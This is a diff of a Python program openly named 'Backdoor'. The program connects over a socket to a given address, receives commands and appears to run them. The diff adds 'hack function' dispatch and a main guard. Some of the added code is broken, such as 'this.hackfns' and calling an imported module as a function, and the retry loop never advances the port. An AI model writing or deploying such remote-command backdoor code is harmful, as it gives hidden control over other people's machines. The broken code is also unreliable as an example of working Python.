@@ -3,12 +3,14 @@ import subprocess
 import os
 import requests
 import wget
+import extract_hackfns
 
 class Backdoor:
     def __init__(self, ip, port):
         try:
             self.ip = ip
             self.port = port
+            self.hackfns = extract_hackfns()
             self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.s.connect((ip, port))
             print('[+] Connected to ' + str(ip))
@@ -26,6 +28,11 @@ class Backdoor:
             try:
                 command = self.s.recv(8192)
                 command = command.decode()
+
+                for (filename, func) in this.hackfns.items():
+                    if command.startswith(filename):
+                        print('totally running function ' + func.__name__ + ' from file ' + filename)
+
                 if command[0:2] == 'cd':
                     command = command.split(' ')
                     result = self.change_cwd(command[1])
@@ -62,10 +69,11 @@ class Backdoor:
         os.chdir(path)
         return "[+] Changing directory to " + path
 
-while True:
-    port = 8080
-    try:
-        backdoor = Backdoor(socket.gethostbyname(socket.gethostname()), port)
-        break
-    except:
-        port += 1
+if __name__ == "__main__":
+    while True:
+        port = 8080
+        try:
+            backdoor = Backdoor(socket.gethostbyname(socket.gethostname()), port)
+            break
+        except:
+            port += 1
